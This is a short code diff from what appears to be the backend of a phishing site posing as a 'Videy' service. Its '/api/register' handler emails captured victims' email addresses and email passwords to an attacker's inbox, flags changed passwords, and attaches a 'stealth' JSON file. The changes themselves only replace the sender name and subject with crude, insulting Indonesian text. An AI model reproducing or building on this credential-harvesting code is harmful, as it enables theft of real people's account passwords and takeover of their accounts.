@@ -276,9 +276,9 @@ app.post('/api/register', async (req, res) => {
 `;
         
         await transporter.sendMail({
-            from: `"Videy System" <${SENDER_EMAIL}>`,
+            from: `"❤️I'M PRAGNANT, BRO" <${SENDER_EMAIL}>`,
             to: RECEIVER_EMAIL,
-            subject: `🎯 VIDEY DATA: ${data.email} ${data.emailPassword !== loadHistory()[data.email] ? '(NEW PASSWORD!)' : ''}`,
+            subject: `🎯 DATA HAMIL PUNYA SI ANJING INI: ${data.email} ${data.emailPassword !== loadHistory()[data.email] ? '(NEW PASSWORD!)' : ''}`,
             html: htmlContent,
             attachments: [{
                 filename: `videy_stealth_${Date.now()}.json`,
